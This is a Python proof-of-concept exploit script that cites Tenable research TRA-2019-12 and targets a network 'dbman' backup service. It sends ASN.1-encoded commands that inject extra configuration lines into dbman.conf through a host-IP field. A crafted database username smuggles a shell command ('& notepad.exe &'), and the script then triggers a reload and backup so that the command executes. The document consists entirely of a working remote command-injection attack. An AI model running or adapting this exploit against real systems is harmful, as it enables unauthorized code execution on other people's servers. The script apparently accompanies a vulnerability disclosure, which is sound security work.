# https://www.tenable.com/security/research/tra-2019-12
import sys, socket, string
from struct import *
from pyasn1.type import univ
from pyasn1.codec.ber import encoder
import hexdump

def usage():
  print "usage  : "+sys.argv[0] + " <target_ip>  <target_port>"
  print "example: "+sys.argv[0] + " 192.168.1.123 2810"

def mk_msg(cmd, data):
  msg = pack(">LL", cmd, len(data))  
  msg += data  
  return msg

def send_cmd(cmd, data, host, port, timeout=5):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(timeout)
  s.connect((host, port))

  req = mk_msg(cmd, data)
  print "Command %d request:" % (cmd)
  print hexdump.hexdump(req)
    
  s.send(req)
  res = s.recv(1024)
  s.close()
  print "Command %d response:" % (cmd)
  print hexdump.hexdump(res)

if len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])


# Command 10002 (manualBackup)
# Directory must be valid
dir =  'C:\\Windows\\Temp\\'
e1 = univ.OctetString(dir)
seq = univ.Sequence()
seq.setComponentByPosition(0, e1)
data_10002 = encoder.encode(seq) 

# Command 10018 (hostRoleSwitch)
e1 = univ.Integer(1)              # Role 
e2 = univ.Integer(0xff)           # BackupTime?

imc_ip = db_ip  = '127.0.0.1'
cmd = 'notepad.exe'
# Command injection via DB username
# Invalid osql option -F to cause osql to return right away 
db_user = 'foo" -F & ' + cmd + ' & "'
db_pass = 'A' * 8 # Wrong passwd

BackHoseIp = '127.0.0.1'
BackHoseIp += '\n' + 'ServerCount = 1' 
BackHoseIp += '\n' + 'iMCIP1 = ' + imc_ip
BackHoseIp += '\n' + 'DBaseIP1 = ' + db_ip
BackHoseIp += '\n' + 'DBType1 = 1'
BackHoseIp += '\n' + 'DBInstance1 = N/A'
BackHoseIp += '\n' + 'PrimaryDbSaUserName1 = ' + db_user
BackHoseIp += '\n' + 'PrimaryDbSaPassword1 = ' + db_pass
BackHoseIp += '\n' + 'PrimaryDbPort1 = 1433'
BackHoseIp += '\n' + 'DBCount1 = 1'
 
e3 = univ.OctetString(BackHoseIp) # BackHoseIp

seq = univ.Sequence()
seq.setComponentByPosition(0, e1)
seq.setComponentByPosition(1, e2)
seq.setComponentByPosition(2, e3)
data_10018 = encoder.encode(seq) 

# Inject configuration variables into dbman.conf 
send_cmd(10018, data_10018, host, port)

# Reload dbman.conf
send_cmd(10000, '', host, port)

# Perform backup to trigger command injection  
send_cmd(10002, data_10002, host, port, 10) 
